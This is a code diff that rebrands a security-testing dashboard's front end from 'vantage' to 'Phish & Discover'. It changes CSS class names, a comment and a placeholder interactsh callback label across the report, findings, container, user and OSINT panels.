                     <td class="px-3 py-2"><span class="px-2 py-1 text-[10px] bg-green-900/30 text-green-400 rounded">Available</span></td>
                     <td class="px-3 py-2 text-right">
-                        <button onclick="downloadReport(${t.id})" class="px-3 py-1 bg-vantage-accent/20 hover:bg-vantage-accent/40 text-vantage-accent rounded text-xs font-bold transition-all">Download PDF</button>
+                        <button onclick="downloadReport(${t.id})" class="px-3 py-1 bg-phish-accent/20 hover:bg-phish-accent/40 text-phish-accent rounded text-xs font-bold transition-all">Download PDF</button>
                     </td>
                 </tr>
             `).join('') || '<tr><td colspan="5" class="px-3 py-6 text-center text-gray-500">No reports available. Complete a task to generate a report.</td></tr>';
@@ -905,10 +905,10 @@
             const onclickAttr = btn.getAttribute('onclick') || '';
             const isMatch = onclickAttr.includes(`'${severity}'`) || (severity === '' && onclickAttr.includes(`filterFindings('')`));
             if (isMatch) {
-                btn.classList.add('scale-105', 'ring-2', 'ring-vantage-accent');
+                btn.classList.add('scale-105', 'ring-2', 'ring-phish-accent');
                 btn.style.opacity = '1';
             } else {
-                btn.classList.remove('scale-105', 'ring-2', 'ring-vantage-accent');
+                btn.classList.remove('scale-105', 'ring-2', 'ring-phish-accent');
                 btn.style.opacity = '0.6';
             }
         });
@@ -1064,7 +1064,7 @@
             document.getElementById('stat-total').textContent = stats.total || '0';
             document.getElementById('stat-critical').textContent = stats.critical || '0';
 
-            // Fetch Vantage campaign count
+            // Fetch Phish & Discover campaign count
             const campaigns = await fetch('/api/campaigns/').then(r => r.ok ? r.json() : []).catch(() => []);
             document.getElementById('stat-campaigns').textContent = Array.isArray(campaigns) ? campaigns.length : 0;
 
@@ -1166,17 +1166,17 @@
             return;
         }
         if (!containers || containers.length === 0) {
-            el.innerHTML = '<p class="text-sm text-vantage-text-dim italic opacity-60">No containers visible.</p>';
+            el.innerHTML = '<p class="text-sm text-phish-text-dim italic opacity-60">No containers visible.</p>';
             return;
         }
         el.innerHTML = containers.map(c => {
             const badgeClass = HEALTH_BADGE[c.health] || HEALTH_BADGE.none;
             const stateColor = c.state === 'running' ? 'bg-emerald-500' : 'bg-gray-500';
             return `
-                <div class="flex items-center justify-between p-3 bg-vantage-bg/30 rounded-xl border border-vantage-border/50">
+                <div class="flex items-center justify-between p-3 bg-phish-bg/30 rounded-xl border border-phish-border/50">
                     <div class="flex items-center gap-3">
                         <span class="w-2 h-2 rounded-full ${stateColor}"></span>
-                        <span class="text-sm font-bold text-vantage-text">${c.name}</span>
+                        <span class="text-sm font-bold text-phish-text">${c.name}</span>
                     </div>
                     <span class="px-3 py-1 rounded-full text-xs font-black uppercase tracking-widest border ${badgeClass}">${c.health}</span>
                 </div>
@@ -1188,7 +1188,7 @@
         const tbody = document.getElementById('sys-users-tbody');
         if (!tbody) return;
         if (!users || users.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="3" class="py-6 text-center text-vantage-text-dim italic opacity-60">No users found.</td></tr>';
+            tbody.innerHTML = '<tr><td colspan="3" class="py-6 text-center text-phish-text-dim italic opacity-60">No users found.</td></tr>';
             return;
         }
         tbody.innerHTML = users.map(u => {
@@ -1196,7 +1196,7 @@
             return `
                 <tr>
                     <td class="py-2 pr-4 font-bold">${u.username}</td>
-                    <td class="py-2 pr-4 font-mono text-vantage-text-dim">${noLogin ? 'Never' : new Date(u.last_login).toLocaleString()}</td>
+                    <td class="py-2 pr-4 font-mono text-phish-text-dim">${noLogin ? 'Never' : new Date(u.last_login).toLocaleString()}</td>
                     <td class="py-2">${u.account_locked ? '<span class="text-red-400">Locked</span>' : '<span class="text-green-400">Active</span>'}</td>
                 </tr>
             `;
@@ -1332,7 +1332,7 @@
         const tbody = document.getElementById('osint-tbody');
         if (!tbody) return;
         // Placeholder: In a real scenario, this would fetch from /api/scanner/osint
-        tbody.innerHTML = '<tr><td colspan="5" class="px-8 py-12 text-center text-vantage-text-dim italic opacity-40">Scanning for external assets... (ProjectDiscovery tools active)</td></tr>';
+        tbody.innerHTML = '<tr><td colspan="5" class="px-8 py-12 text-center text-phish-text-dim italic opacity-40">Scanning for external assets... (ProjectDiscovery tools active)</td></tr>';
     }
 
     async function initInteractsh() {
@@ -1340,8 +1340,8 @@
         if (!logContainer) return;
         // Placeholder: Set status and URL
         document.getElementById('interactsh-status').textContent = 'Engine Ready';
-        document.getElementById('interactsh-dot').className = 'w-3 h-3 rounded-full bg-vantage-accent animate-pulse shadow-lg shadow-vantage-accent/20';
-        document.getElementById('interactsh-url').textContent = 'vantage-' + Math.random().toString(36).substring(7) + '.oob.sh';
+        document.getElementById('interactsh-dot').className = 'w-3 h-3 rounded-full bg-phish-accent animate-pulse shadow-lg shadow-phish-accent/20';
+        document.getElementById('interactsh-url').textContent = 'Phish & Discover-' + Math.random().toString(36).substring(7) + '.oob.sh';
     }
 
     async function startInteractsh() {
